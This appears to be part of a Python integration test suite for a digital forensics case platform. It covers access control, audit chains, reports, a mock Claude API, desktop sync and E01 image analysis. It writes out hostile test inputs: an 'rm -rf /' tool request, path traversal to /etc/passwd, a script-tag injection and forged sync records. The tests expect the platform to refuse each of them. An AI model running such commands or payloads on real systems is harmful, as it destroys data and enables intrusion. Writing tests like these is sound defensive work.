    near = {e['target'] for e in f['edges'] if e['source'] == 'person:alice'} | {e['source'] for e in f['edges'] if e['target'] == 'person:alice'}
    check('node types can be filtered; focusing on alice gives her and her neighbours only',
          {n['type'] for n in t['nodes']} <= {'person', 'domain'} and t['nodes']
          and all(n['id'] == 'person:alice' or n['id'] in near for n in f['nodes']) and len(f['nodes']) == len(near) + 1, (len(f['nodes']), len(near)))
    check('a bad type is refused (400); another investigator cannot see the graph (404)',
          get(f'/api/cases/{A}/graph?types=planet', inv).status == 400 and get(f'/api/cases/{A}/graph', C['INV2']).status == 404)

    s1, s2 = get(f'/api/cases/{A}/summary', inv).json, get(f'/api/cases/{A}/summary', inv).json
    facts = s1['facts']
    check('the summary is the same each time it is built (facts numbered F1, F2 ... in order)',
          [f['text'] for f in facts] == [f['text'] for f in s2['facts']] and [f['id'] for f in facts] == [f'F{i}' for i in range(1, len(facts) + 1)], len(facts))
    missing = [(f['id'], r) for f in facts for r in f['refs'] if not (ObjectId.is_valid(r['id']) and db[r['collection']].find_one({'_id': ObjectId(r['id'])}))]
    text = ' '.join(f['text'] for f in facts)
    check('every fact cites records that exist; the summary says the payroll export was recycled, the SanDisk drive was used, SecureDelete stands out and the finding was approved',
          not missing and 'C:\\Users\\alice\\Documents\\payroll-export.csv was moved to the Recycle Bin at 2026-09-01' in text and '4C530001230518109141' in text
          and 'securedelete' in text.lower() and 'Finding (approved' in text and all(f'[{f["id"]}]' in ' '.join(p['text'] for p in s1['paragraphs']) for f in facts),
          (missing[:3], text[:600]))
    C['SUMMARY_FACTS'] = facts


CLAUDE_REQUESTS, CLAUDE_REPLY = [], {}


def _start_claude_mock():
    """An Anthropic Messages API stand-in on port 18081 (ANTHROPIC_BASE_URL in compose.yml): records every request and
    answers with CLAUDE_REPLY's text (by default, a sentence citing every fact it was sent)."""
    import http.server
    import threading

    class Handler(http.server.BaseHTTPRequestHandler):
        def do_POST(self):
            body = json.loads(self.rfile.read(int(self.headers.get('Content-Length') or 0)) or b'{}')
            CLAUDE_REQUESTS.append({'path': self.path, 'headers': {k.lower(): v for k, v in self.headers.items()}, 'body': body})
            user = (body.get('messages') or [{}])[0].get('content') or ''
            ids = re.findall(r'^\[(F\d+)\]', user, re.M)
            text = CLAUDE_REPLY.get('text') or ('The records show this ' + ''.join(f'[{i}]' for i in ids) + '.')
            out = json.dumps({'id': f'msg_{len(CLAUDE_REQUESTS)}', 'type': 'message', 'role': 'assistant', 'model': body.get('model'),
                              'content': [] if CLAUDE_REPLY.get('stop') == 'refusal' else [{'type': 'text', 'text': text}],
                              'stop_reason': CLAUDE_REPLY.get('stop') or 'end_turn', 'stop_sequence': None,
                              **({'stop_details': {'type': 'refusal', 'category': 'cyber', 'explanation': 'declined'}} if CLAUDE_REPLY.get('stop') == 'refusal' else {}),
                              'usage': {'input_tokens': 100 + len(user) // 4, 'output_tokens': 20}}).encode()
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.send_header('Content-Length', str(len(out)))
            self.end_headers()
            self.wfile.write(out)

        def log_message(self, *args):
            pass

    server = http.server.ThreadingHTTPServer(('0.0.0.0', 18081), Handler)
    threading.Thread(target=server.serve_forever, daemon=True).start()


@section('16f Claude mode of the case assistant (against a recording stand-in)')
def t_claude():
    inv, A = C['INVESTIGATOR'], C['A']
    db = mongo()
    facts = C.get('SUMMARY_FACTS') or get(f'/api/cases/{A}/summary', inv).json['facts']
    s = get(f'/api/cases/{A}/ai', inv).json
    before = len(CLAUDE_REQUESTS)
    pick = [f['id'] for f in facts if 'Recycle Bin' in f['text'] or '4C530001230518109141' in f['text']][:2]
    check('Claude mode is off for a case until turned on: asking is refused (409) and nothing is sent',
          s['enabled'] is False and s['configured'] is True and s['model'] == 'claude-opus-5-5'
          and post(f'/api/cases/{A}/ai/ask', inv, {'question': 'What happened?', 'fact_ids': pick}).status == 409 and len(CLAUDE_REQUESTS) == before, s)
    check('only someone who may update the case turns it on (viewer and analyst 403)',
          req('PUT', f'/api/cases/{A}/ai', C['VIEWER'], {'enabled': True}).status == 403 and req('PUT', f'/api/cases/{A}/ai', C['ANALYST'], {'enabled': True}).status == 403)
    on = req('PUT', f'/api/cases/{A}/ai', inv, {'enabled': True})
    check('the investigator turns it on (audited)', on.status == 200 and on.json['enabled'] and db.audit_logs.find_one({'action': 'AI_ASSIST_ENABLED', 'metadata.case_id': A}), on)
    check('facts that are not in the summary are refused (400)', post(f'/api/cases/{A}/ai/ask', inv, {'question': 'What happened?', 'fact_ids': ['F9999']}).status == 400)
    q = 'In what order did the USB drive and the deletion happen?'
    r = post(f'/api/cases/{A}/ai/ask', inv, {'question': q, 'fact_ids': pick})
    sent = CLAUDE_REQUESTS[before:] if len(CLAUDE_REQUESTS) > before else [{}]
    body, headers = sent[-1].get('body') or {}, sent[-1].get('headers') or {}
    user = (body.get('messages') or [{}])[0].get('content') or ''
    others = [f for f in facts if f['id'] not in pick]
    check('one request to Claude (Opus 5.5, medium effort, server-side refusal fallback) carrying the two selected facts and the question, and nothing else from the case',
          r.status == 200 and len(sent) == 1 and body.get('model') == 'claude-opus-5-5' and body.get('fallbacks') == 'default'
          and 'server-side-fallback-2026-07-01' in headers.get('anthropic-beta', '') and body.get('output_config') == {'effort': 'medium'}
          and headers.get('x-api-key') == 'test-anthropic-key' and len(re.findall(r'^\[F\d+\]', user, re.M)) == 2
          and all(f'[{f["id"]}] {f["text"]}' in user for f in facts if f['id'] in pick) and not any(f['text'] in user for f in others)
          and user.endswith(f'Question: {q}'), (r, user[:500]))
    doc = db.ai_requests.find_one({'ai_request_id': r.json.get('ai_request_id')}) or {}
    audit = db.audit_logs.find_one({'action': 'AI_PROMPT_SENT', 'metadata.ai_request_id': r.json.get('ai_request_id')}) or {}
    check('the answer cites the facts sent; the prompt is kept with its SHA-256, which the audit record repeats',
          r.json['status'] == 'ANSWERED' and r.json['citations'] == pick and r.json['unknown_citations'] == []
          and doc.get('prompt') == user and doc.get('prompt_sha256') == hashlib.sha256(user.encode()).hexdigest() == (audit.get('metadata') or {}).get('prompt_sha256')
          and (audit.get('metadata') or {}).get('fact_ids') == pick, (r.json, audit.get('metadata')))
    CLAUDE_REPLY['text'] = f'It came first [{pick[0]}], then [F9999].'
    r2 = post(f'/api/cases/{A}/ai/ask', inv, {'question': 'And then?', 'fact_ids': pick[:1]})
    CLAUDE_REPLY.clear()
    CLAUDE_REPLY['stop'] = 'refusal'
    r3 = post(f'/api/cases/{A}/ai/ask', inv, {'question': 'Something declined', 'fact_ids': pick[:1]})
    CLAUDE_REPLY.clear()
    check('a citation of a fact that was not sent is reported; a declined request is kept as refused',
          r2.json.get('unknown_citations') == ['F9999'] and r2.json.get('citations') == pick[:1]
          and r3.status == 200 and r3.json['status'] == 'REFUSED' and r3.json['refusal_category'] == 'cyber', (r2.json, r3.json))
    h = get(f'/api/cases/{A}/ai/requests', inv).json['data']
    check('every question asked is listed for the case; another investigator cannot see them (404)',
          [x['question'] for x in h[:3]] == ['Something declined', 'And then?', q] and get(f'/api/cases/{A}/ai/requests', C['INV2']).status == 404)
    req('PUT', f'/api/cases/{A}/ai', inv, {'enabled': False})


@section('17 Analyst assigned to a case')
def t_analyst():
    inv, an, A = C['INVESTIGATOR'], C['ANALYST'], C['A']
    check('analyst cannot see the case before assignment', get(f'/api/cases/{A}', an).status == 404)
    up = patch(f'/api/cases/{A}', inv, {'investigator_id': C['ANALYST_id']})
    check('investigator assigns the analyst', up.status == 200 and up.json['investigator_id'] == C['ANALYST_id'], up)
    check('creator keeps access after reassigning', get(f'/api/cases/{A}', inv).status == 200)
    check('analyst can now read the case and its timeline', get(f'/api/cases/{A}', an).status == 200
          and get(f'/api/forensics/timeline?case_id={A}&limit=1', an).status == 200)
    check('analyst can record findings', post('/api/findings', an, {'case_id': A, 'title': 'Analyst note', 'description': 'Reviewed USB.'}).status == 200)
    check('analyst can run analysis tools', post(f'/api/forensics/patterns?case_id={A}', an).status == 200)
    check('analyst cannot upload evidence (403)', upload(an, A, b'x' * 10, 'x.dd').status == 403)
    check('analyst cannot generate reports (403)', post(f'/api/reports?case_id={A}', an).status == 403)
    check('analyst cannot update the case (403)', patch(f'/api/cases/{A}', an, {'status': 'ON_HOLD'}).status == 403)
    notes = get('/api/notifications', an).json['data']
    check('analyst is notified of the assignment', any(A in n.get('message', '') for n in notes), [n.get('message') for n in notes[:3]])


@section('18 Reports')
def t_reports():
    inv, A = C['INVESTIGATOR'], C['A']
    r1 = post(f'/api/reports?case_id={A}', inv)
    check('report is generated', r1.status == 200 and re.fullmatch(r'RPT-\d{3}', r1.json['report_id']) and r1.json['version'] == 1, r1)
    pdf = get(f"/api/reports/{r1.json['report_id']}/download", inv)
    check('download is a PDF', pdf.status == 200 and pdf.body[:5] == b'%PDF-', pdf.body[:10])
    check('PDF SHA-256 equals the recorded value and the header', hashlib.sha256(pdf.body).hexdigest() == r1.json['sha256']
          == (pdf.headers.get('X-DFIP-Report-SHA256') or pdf.headers.get('x-dfip-report-sha256')), r1.json['sha256'])
    (OUT / 'report-A.pdf').write_bytes(pdf.body)
    C['REPORT_A'] = r1.json['report_id']
    r2 = post(f'/api/reports?case_id={A}', inv)
    check('a second report gets version 2 and a new ID', r2.json['version'] == 2 and r2.json['report_id'] != r1.json['report_id'], r2)
    check('report list filtered by case', {x['report_id'] for x in get(f'/api/reports?case_id={A}', inv).json['data']} >= {r1.json['report_id'], r2.json['report_id']})
    check('another investigator cannot download it (404)', get(f"/api/reports/{r1.json['report_id']}/download", C['INV2']).status == 404)
    check("...nor see it in the report list", all(x['case_id'] != A for x in get('/api/reports', C['INV2']).json['data']))
    xc = post('/api/cases', inv, {'name': '<b>Bold</b> & "quoted" <script>alert(1)</script>', 'description': '<para>unclosed & </i>'}).json['case_id']
    xr = post(f'/api/reports?case_id={xc}', inv)
    check('markup characters in case text do not break report generation', xr.status == 200, xr)
    if xr.status == 200:
        (OUT / 'report-markup.pdf').write_bytes(get(f"/api/reports/{xr.json['report_id']}/download", inv).body)
    pf = Path(get(f"/api/reports?case_id={A}", C['ADMIN']).json['data'][0]['path'])
    check('report file is stored under storage/reports', '/reports/' in str(pf) and pf.exists(), pf)


@section('19 Chain of custody and audit log')
def t_audit():
    inv, A = C['INVESTIGATOR'], C['A']
    ch = get(f'/api/chain?case_id={A}', inv).json
    actions = {c['action'] for c in ch['data']}
    check('custody covers registration, verification, analysis integrity check and recovery',
          {'EVIDENCE_REGISTERED', 'EVIDENCE_VERIFIED', 'ANALYSIS_INTEGRITY_CHECK', 'FILE_RECOVERED'} <= actions, actions)
    check('custody listing reports the audit chain status', ch.get('audit_chain', {}).get('valid') is True, ch.get('audit_chain'))
    check("custody records of other teams' cases are not listed", all(c['case_id'] != A for c in get('/api/chain', C['INV2']).json['data']))
    v = get('/api/chain/verify', C['ADMIN']).json
    import pymongo
    total = pymongo.MongoClient(os.environ['MONGODB_URI'])['dfip'].audit_logs.count_documents({})
    check('audit hash chain verifies, covering every record', v['valid'] is True and v['records_checked'] == total, (v, total))
    log = get('/api/admin/audit', C['ADMIN']).json['data']
    acts = {x['action'] for x in log}
    want = {'LOGIN', 'CASE_CREATED', 'CASE_UPDATED', 'EVIDENCE_UPLOADED', 'EVIDENCE_VERIFIED', 'FILE_RECOVERED', 'ARTIFACT_DOWNLOADED',
            'FINDING_CREATED', 'REPORT_GENERATED', 'USER_REGISTERED', 'USER_UPDATED', 'USER_CREATED', 'PASSWORD_CHANGED'}
    check('audit log records every kind of action exercised', want <= acts, want - acts)
    check('audit records carry user, role, time and hash links', all(k in log[0] for k in ('user_id', 'user_role', 'timestamp', 'record_hash', 'previous_hash', 'sequence')), log[0].keys())
    seqs = sorted(x['sequence'] for x in log)
    check('audit sequence numbers are contiguous', seqs == list(range(seqs[0], seqs[0] + len(seqs))), seqs[:5])
    inv_log = get('/api/admin/audit', inv).json['data']
    d_oid = str(pymongo.MongoClient(os.environ['MONGODB_URI'])['dfip'].cases.find_one({'case_id': C['D']})['_id'])
    other = [x for x in inv_log if x.get('metadata', {}).get('case_id') == C['D'] or x.get('resource_id') in (C['D'], d_oid)]
    check("an investigator's audit view excludes other teams' cases", not other, [(x['action'], x.get('resource_id')) for x in other[:3]])
    check("...and shows the investigator's own case activity", any(x.get('metadata', {}).get('case_id') == A and x['action'] == 'EVIDENCE_UPLOADED' for x in inv_log))
    check('administrators still see every record', any(x.get('resource_id') == d_oid for x in log) or len(log) == 300)


@section('20 Notifications')
def t_notifications():
    inv = C['INVESTIGATOR']
    n = get('/api/notifications', inv).json['data']
    check('job completion notifications are delivered', any('completed' in x.get('message', '').lower() for x in n), [x.get('title') for x in n[:5]])
    first = n[0]
    check('mark as read', patch(f"/api/notifications/{first['_id']}/read", inv).status == 200
          and next(x for x in get('/api/notifications', inv).json['data'] if x['_id'] == first['_id']).get('read') is True)
    check("cannot mark another user's notification (404)", patch(f"/api/notifications/{first['_id']}/read", C['VIEWER']).status == 404)
    check('invalid notification id is 400', patch('/api/notifications/zzz/read', inv).status == 400)


@section('21 Administration')
def t_admin():
    ad = C['ADMIN']
    st = get('/api/admin/stats', ad).json
    import pymongo
    db = pymongo.MongoClient(os.environ['MONGODB_URI'])['dfip']
    check('stats equal the database counts', st['users'] == db.users.count_documents({}) and st['cases'] == db.cases.count_documents({})
          and st['evidence'] == db.evidence.count_documents({}) and st['reports'] == db.reports.count_documents({}), st)
    check('security events list', get('/api/admin/security', ad).status == 200)
    inv = get('/api/admin/investigators', C['INVESTIGATOR']).json['data']
    check('assignable people exclude viewers', inv and all(u['role'] != 'VIEWER' for u in inv), [u['role'] for u in inv])
    roles = {r['name']: r['permissions'] for r in get('/api/admin/roles', ad).json['data']}
    check('four roles with permissions', set(roles) == {'ADMIN', 'INVESTIGATOR', 'ANALYST', 'VIEWER'}, roles.keys())
    an_perms = roles['ANALYST']
    patch('/api/admin/roles/ANALYST', ad, {'permissions': an_perms + ['REPORT_CREATE']})
    check('granting a permission takes effect immediately', post(f"/api/reports?case_id={C['A']}", C['ANALYST']).status == 200)
    patch('/api/admin/roles/ANALYST', ad, {'permissions': an_perms})
    check('revoking it takes effect immediately', post(f"/api/reports?case_id={C['A']}", C['ANALYST']).status == 403)
    check('unknown role is 404', patch('/api/admin/roles/SUPERUSER', ad, {'permissions': []}).status == 404)


@section('22 Desktop workstation API')
def t_desktop():
    inv, E = C['INVESTIGATOR'], C['E']
    dev = f'test-ws-{uuid.uuid4().hex[:8]}'
    r = post('/api/desktop/register', inv, {'device_id': dev, 'device_name': 'FORENSIC-WS-01', 'app_version': '2.1.0', 'os': 'windows'})
    check('workstation registers and receives a device token', r.status == 200 and r.json.get('device_token'), r)
    C['DEV'], C['DEV_TOKEN'] = dev, r.json.get('device_token')
    check('heartbeat from the registered device', post(f'/api/desktop/heartbeat?device_id={dev}', inv).status == 200)
    check('heartbeat for an unknown device is 403', post('/api/desktop/heartbeat?device_id=other-device', inv).status == 403)
    s = get('/api/desktop/status', inv).json
    check('status shows the device online', s.get('is_online') is True and any(d.get('device_id') == dev for d in s.get('devices', [])), s)
    j = post(f'/api/jobs/desktop/{E}?job_type=DESKTOP_HASH_FILE', inv).json
    check('a desktop job is queued for the workstation', j.get('status') == 'PENDING_DESKTOP', j)
    check('it is in the workstation queue', any(x['job_id'] == j['job_id'] for x in get('/api/desktop/jobs', inv).json['data']))
    check('invalid desktop job type is 400', post(f'/api/jobs/desktop/{E}?job_type=FORMAT_DISK', inv).status == 400)
    check("another user cannot claim it (403)", post(f"/api/desktop/jobs/{j['job_id']}/claim?device_id=x", C['INV2']).status == 403)
    c = post(f"/api/desktop/jobs/{j['job_id']}/claim?device_id={dev}", inv)
    check('claim', c.status == 200 and c.json['status'] == 'ASSIGNED', c)
    check('a job cannot be claimed twice (409)', post(f"/api/desktop/jobs/{j['job_id']}/claim?device_id={dev}", inv).status == 409)
    check('start', post(f"/api/desktop/jobs/{j['job_id']}/start", inv).json['status'] == 'RUNNING')
    done = post(f"/api/desktop/jobs/{j['job_id']}/complete", inv, {'result': {'sha256': C['IMG_SHA256']}, 'summary': 'hash matches'})
    check('complete', done.json['status'] == 'COMPLETED', done)
    j2 = post(f'/api/jobs/desktop/{E}?job_type=DESKTOP_RUN_TOOL', inv).json
    f = post(f"/api/desktop/jobs/{j2['job_id']}/fail", inv, {'error': 'tool missing'})
    check('fail', f.json['status'] == 'FAILED' and f.json['error'] == 'tool missing', f)
    t = post('/api/desktop/jobs/create?job_type=DESKTOP_RUN_TOOL', inv, {'tool': 'rm', 'args': ['-rf', '/']})
    check('tools outside the allow-list are refused (400)', t.status == 400, t)
    pull = get('/api/desktop/sync/pull', inv).json
    check("sync pull returns the user's cases only", C['A'] in {x['case_id'] for x in pull['cases']} and C['D'] not in {x['case_id'] for x in pull['cases']})
    info = get('/api/desktop/download/info').json
    check('download info works without signing in', isinstance(info.get('files'), list), info)
    check('download path traversal is refused', get('/api/desktop/download/file/..%2F..%2Fapp%2Fapp%2Fcore%2Fconfig.py').status in (400, 404)
          and get('/api/desktop/download/file/%2E%2E%2F%2E%2E%2Fetc%2Fpasswd').status in (400, 404))

    # --- security: offline sync must not bypass case access and RBAC
    v = C['VIEWER']
    now = datetime.now(timezone.utc) + timedelta(days=1)
    rec = lambda t, rid, data, case=None: {'record_type': t, 'record_id': rid, 'case_id': case, 'data': data,
                                            'local_created_at': now.isoformat(), 'local_modified_at': now.isoformat(), 'device_id': 'x'}
    before = get(f"/api/cases/{C['A']}", C['ADMIN']).json
    post('/api/desktop/sync/push', v, {'device_id': 'x', 'records': [rec('case_update', 'u1', {'member_ids': [C['VIEWER_id']], 'status': 'ARCHIVED'}, C['A'])]})
    after = get(f"/api/cases/{C['A']}", C['ADMIN']).json
    check("sync push cannot change a case the user cannot access", after.get('status') == before.get('status')
          and C['VIEWER_id'] not in (after.get('member_ids') or []), {'status': after.get('status'), 'member_ids': after.get('member_ids')})
    check('...so a viewer cannot grant themselves access', get(f"/api/cases/{C['A']}", v).status == 404)
    patch(f"/api/cases/{C['A']}", inv, {'status': before.get('status')})  # undo, if the push went through
    import pymongo
    db = pymongo.MongoClient(os.environ['MONGODB_URI'])['dfip']
    db.cases.update_one({'case_id': C['A']}, {'$set': {'member_ids': before.get('member_ids') or []}})
    post('/api/desktop/sync/push', v, {'device_id': 'x', 'records': [rec('custody_event', f'c-{uuid.uuid4().hex}', {
        'case_id': C['A'], 'evidence_id': C['E'], 'action': 'EVIDENCE_VERIFIED', 'status': 'VERIFIED', 'sha256': 'f' * 64,
        'timestamp': datetime.now(timezone.utc).isoformat()})]})
    forged = [c for c in get(f"/api/chain?case_id={C['A']}", inv).json['data'] if c.get('sha256') == 'f' * 64]
    check('sync push cannot add chain-of-custody records to a case (viewer, no access)', not forged, forged[:1])
    post('/api/desktop/sync/push', v, {'device_id': 'x', 'records': [rec('finding', f'f-{uuid.uuid4().hex}', {
        'case_id': C['A'], 'title': 'Injected finding', 'description': 'x', 'severity': 'LOW'})]})
    check('sync push cannot create findings in a case (viewer, no access)',
          not any(x['title'] == 'Injected finding' for x in get(f"/api/findings?case_id={C['A']}", inv).json['data']))
    db.chain_of_custody.delete_many({'sha256': 'f' * 64})
    db.findings.delete_many({'title': 'Injected finding'})
    # legitimate offline changes from a case member still sync
    push = post('/api/desktop/sync/push', inv, {'device_id': dev, 'records': [
        rec('finding', 'off-1', {'title': 'Offline finding', 'description': 'written offline', 'severity': 'MEDIUM', 'created_by': 'someone-else'}, C['A']),
        rec('custody_event', 'off-2', {'evidence_id': C['E'], 'action': 'local_hash_check', 'sha256': C['IMG_SHA256'], 'status': 'MATCH'}, C['A']),
        rec('case_update', 'off-3', {'description': 'Updated offline', 'investigator_id': C['VIEWER_id'], 'member_ids': [C['VIEWER_id']]}, C['A']),
        rec('audit_event', f'off-4-{uuid.uuid4().hex}', {'action': 'EVIDENCE_VERIFIED', 'note': 'offline'}),
    ]}).json['results']
    check('a case member can sync offline changes', [x['status'] for x in push] == ['SYNCED'] * 4, push)
    of = next((x for x in get(f"/api/findings?case_id={C['A']}", inv).json['data'] if x['title'] == 'Offline finding'), {})
    check('offline finding is attributed to the syncing user', of.get('created_by') == C['INVESTIGATOR_id'], of.get('created_by'))
    oc = [c for c in get(f"/api/chain?case_id={C['A']}", inv).json['data'] if c.get('local_id') == 'off-2']
    check('offline custody events are labelled as workstation events', oc and oc[0]['action'] == 'DESKTOP_LOCAL_HASH_CHECK', oc[:1])
    case_now = get(f"/api/cases/{C['A']}", C['ADMIN']).json
    check('offline case update changes only allowed fields', case_now['description'] == 'Updated offline'
          and case_now['investigator_id'] != C['VIEWER_id'] and C['VIEWER_id'] not in (case_now.get('member_ids') or []), case_now)
    check('offline audit events use a fixed action name and keep the chain valid',
          any(x['action'] == 'DESKTOP_OFFLINE_EVENT' for x in get('/api/admin/audit', C['ADMIN']).json['data'])
          and get('/api/chain/verify', C['ADMIN']).json['valid'] is True)
    check('a viewer cannot sync a case update even into an assigned case', post('/api/desktop/sync/push', v, {'device_id': 'x', 'records': [
        rec('case_update', 'v-1', {'status': 'ARCHIVED'}, C['V_CASE'])]}).json['results'][0]['status'] == 'SYNC_REJECTED')


@section('23 Real-time events (WebSocket)')
def t_websocket():
    import websockets

    async def run():
        out = {}
        try:
            async with websockets.connect(f'ws://127.0.0.1:8000/ws?token=bad') as ws:
                await asyncio.wait_for(ws.recv(), 3)
            out['bad'] = 'accepted'
        except Exception as e:
            out['bad'] = type(e).__name__
        inv_ws = await websockets.connect(f"ws://127.0.0.1:8000/ws?token={C['INVESTIGATOR']}")
        other_ws = await websockets.connect(f"ws://127.0.0.1:8000/ws?token={C['INV2']}")
        await inv_ws.send(json.dumps({'type': 'ping'}))
        out['pong'] = json.loads(await asyncio.wait_for(inv_ws.recv(), 5)).get('type')
        await asyncio.get_running_loop().run_in_executor(None, lambda: post('/api/findings', C['INVESTIGATOR'], {
            'case_id': C['A'], 'title': 'Secret finding title 7x9', 'description': 'x', 'severity': 'LOW'}))
        await asyncio.get_running_loop().run_in_executor(None, lambda: post(f"/api/evidence/{C['E']}/verify", C['INVESTIGATOR']))

        async def drain(ws):
            msgs = []
            try:
                while True:
                    msgs.append(json.loads(await asyncio.wait_for(ws.recv(), 2)))
            except Exception:
                return msgs
        out['inv'] = await drain(inv_ws)
        out['other'] = await drain(other_ws)
        await inv_ws.close()
        await other_ws.close()
        return out

    o = asyncio.run(run())
    check('connection with an invalid token is refused', o['bad'] != 'accepted', o['bad'])
    check('ping/pong keep-alive', o['pong'] == 'pong', o['pong'])
    types = [m.get('type') for m in o['inv']]
    check('case member receives FINDING_CREATED and EVIDENCE_VERIFICATION_COMPLETED live', 'FINDING_CREATED' in types
          and 'EVIDENCE_VERIFICATION_COMPLETED' in types, types)
    leaked = [m for m in o['other'] if C['A'] in json.dumps(m)]
    check("users without access to a case receive none of its live events", not leaked,
          [f"{m.get('type')}: {json.dumps(m.get('data'))[:120]}" for m in leaked[:3]])


@section('24 Threat intelligence, assistant and demo data')
def t_misc():
    inv, A = C['INVESTIGATOR'], C['A']
    p = get('/api/threat-intel/providers', inv).json
    check('providers report which have keys (only VirusTotal here, pointed at the stand-in)', p == {'virustotal': True, 'abuseipdb': False, 'otx': False, 'urlhaus': False}, p)
    h = post(f"/api/threat-intel/hash/{hashlib.sha256(CLEANUP).hexdigest()}?case_id={A}", inv)
    check('a manual hash lookup goes to the configured VirusTotal address and reports an unknown hash as not found', h.status == 200
          and (h.json.get('virustotal') or {}).get('status') == 'NOT_FOUND'
          and any(r_['path'].endswith(hashlib.sha256(CLEANUP).hexdigest()) for r_ in VT_REQUESTS), h)
    note('manual hash lookup result', json.dumps(h.json)[:300])
    ip = post(f'/api/threat-intel/ip/203.0.113.7?case_id={A}', inv)
    check('IP lookup without keys answers cleanly', ip.status == 200, ip)
    dm = post(f'/api/threat-intel/domain/example.com?case_id={A}', inv, timeout=60)
    check('domain lookup without a URLhaus key says NOT_CONFIGURED and sends nothing', dm.status == 200
          and (dm.json or {}).get('urlhaus', {}).get('status') == 'NOT_CONFIGURED', str(dm)[:300])
    check('threat intel needs case access (404)', post(f'/api/threat-intel/ip/203.0.113.7?case_id={A}', C['INV2']).status == 404)
    ai = post(f'/api/forensics/ai?question=Which%20USB%20devices%20were%20connected%3F&case_id={A}', inv, timeout=120)
    check('case assistant answers without errors', ai.status == 200, str(ai)[:300])
    note('assistant answer', json.dumps(ai.json)[:400] if ai.json else ai)
    sd = post(f'/api/forensics/demo/seed/{A}', inv)
    check('synthetic demo data cannot be added to a real case (403)', sd.status == 403, sd)
    ex = post(f"/api/forensics/evidence/{C['B_E']}/examine?offset=2048", inv)
    check('direct examination (partitions + filesystem) works', ex.status == 200 and ex.json.get('persisted_artifacts', 0) > 0, str(ex)[:200])
    an = post(f"/api/forensics/evidence/{C['B_E']}/analyze", inv)
    check('quick engine analysis works', an.status == 200, str(an)[:200])


@section('25 E01 (EnCase) image support')
def t_e01():
    inv = C['INVESTIGATOR']
    work = Path(tempfile.mkdtemp())
    with IMG.open('rb') as src:
        proc = subprocess.run(['ewfacquirestream', '-t', str(work / 'laptop'), '-C', 'TEST', '-D', 'test', '-E', 'EV1', '-e', 'tester',
                               '-N', 'none', '-f', 'encase6', '-q'], stdin=src, capture_output=True, timeout=600)
    e01 = work / 'laptop.E01'
    check('E01 created from the raw image with ewfacquirestream', e01.exists(), proc.stderr[-300:])
    if not e01.exists():
        return
    note('E01 size vs raw', f'{e01.stat().st_size} vs {IMG.stat().st_size} bytes')
    case = post('/api/cases', inv, {'name': 'E01 test'}).json['case_id']
    r = upload(inv, case, e01.read_bytes(), 'laptop.E01')
    check('E01 uploads with format E01', r.status == 200 and r.json['format'] == 'E01', r)
    eid = C['E01_E'] = r.json['evidence_id']
    pre = get(f'/api/forensics/evidence/{eid}/partitions', inv)
    check('before analysis, examining the E01 asks to run the analysis first (409)', pre.status == 409 and 'analysis' in pre.detail.lower(), pre)
    j = wait_job(inv, post(f"/api/jobs/analysis/{eid}", inv, {'profile': 'full'}).json['job_id'])  # as the raw image was analysed
    check('E01 analysis completes', j['status'] == 'COMPLETED', j.get('error'))
    wc = [c for c in get(f'/api/chain?case_id={case}', inv).json['data'] if c['action'] == 'WORKING_COPY_CREATED']
    check('the verified raw working copy is recorded in the chain of custody', wc and wc[0]['sha256'] == C['IMG_SHA256'],
          wc[:1] or 'no WORKING_COPY_CREATED record')
    check('the uploaded E01 itself is unchanged', hashlib.sha256(Path(r.json['storage_path']).read_bytes()).hexdigest() == r.json['sha256'])
    check('partitions can be examined after the analysis', get(f'/api/forensics/evidence/{eid}/partitions', inv).status == 200)
    if j['status'] == 'COMPLETED':
        c = j['result']['summary']['counts']
        raw = get(f"/api/evidence/{C['E']}", inv).json['analysis_summary']  # now, with the hash sets imported since
        same = {k: (c.get(k), raw.get(k)) for k in raw if c.get(k) != raw.get(k)}
        check('E01 analysis finds exactly what the raw image analysis found', not same, same)
        dele = get(f"/api/forensics/evidence/{r.json['evidence_id']}/files?deleted=true", inv).json['data']
        pay = next((d for d in dele if d['path'].endswith('payroll-export.csv')), None)
        rr = post(f"/api/forensics/evidence/{r.json['evidence_id']}/recover?inode={pay['inode']}&offset={pay['partition_offset']}", inv).json if pay else {}
        check('deleted file recovered from the E01 matches the original', rr.get('sha256') == hashlib.sha256(PAYROLL).hexdigest(), rr)
        import base64
        pg = get(f"/api/forensics/evidence/{eid}/content?inode={pay['inode']}&offset={pay['partition_offset']}", inv).json if pay else {}
        check('the file viewer reads the E01 through its verified working copy', base64.b64decode(pg.get('data_b64') or '') == PAYROLL, pg.get('size'))
    bad = bytearray(e01.read_bytes())
    bad[len(bad) // 2] ^= 0xFF  # corrupt one byte of compressed media data
    rb = upload(inv, case, bytes(bad), 'corrupt.E01').json
    jb = wait_job(inv, post(f"/api/jobs/analysis/{rb['evidence_id']}", inv).json['job_id'])
    check('a corrupted E01 is refused by ewfverify, not analysed', jb['status'] == 'FAILED' and 'E01' in (jb.get('error') or ''), (jb['status'], jb.get('error')))


@section('26 Bad input images')
def t_bad_images():
    inv = C['INVESTIGATOR']
    case = post('/api/cases', inv, {'name': 'Bad images'}).json['case_id']
    for name, data in (('empty.dd', b''), ('random.dd', os.urandom(4 * 1024 * 1024)), ('text.raw', b'just some text\n' * 1000)):
        r = upload(inv, case, data, name)
        if not check(f'{name}: upload accepted and hashed', r.status == 200 and r.json['sha256'] == hashlib.sha256(data).hexdigest(), r):
            continue
        j = wait_job(inv, post(f"/api/jobs/analysis/{r.json['evidence_id']}", inv).json['job_id'], timeout=300)
        ev = get(f"/api/evidence/{r.json['evidence_id']}", inv).json
        check(f'{name}: analysis ends (no hang) and the evidence is not left RUNNING',
              j['status'] in ('COMPLETED', 'FAILED') and ev.get('analysis_status') != 'RUNNING', (j['status'], ev.get('analysis_status')))
        note(f'{name} analysis outcome', f"{j['status']}: {j.get('error') or (j.get('result') or {}).get('summary', {}).get('warnings')}")
    big = post('/api/cases', inv, {'name': 'n' * 120})
    check('120-character case name is accepted (limit)', big.status == 200, big)


@section('27 Cancelling an analysis')
def t_cancel():
    inv = C['INVESTIGATOR']
    jid = post(f"/api/jobs/analysis/{C['B_E']}", inv).json['job_id']
    c = post(f'/api/jobs/{jid}/cancel', inv)
    check('cancel request accepted', c.status == 200 and c.json['status'] in ('CANCELLED', 'COMPLETED'), c)
    time.sleep(8)
    j = get(f'/api/jobs/{jid}', inv).json
    ev = get(f"/api/evidence/{C['B_E']}", inv).json
    check('cancelled job stays cancelled and the evidence is not stuck RUNNING', j['status'] in ('CANCELLED', 'COMPLETED')
          and ev.get('analysis_status') != 'RUNNING', (j['status'], ev.get('analysis_status')))
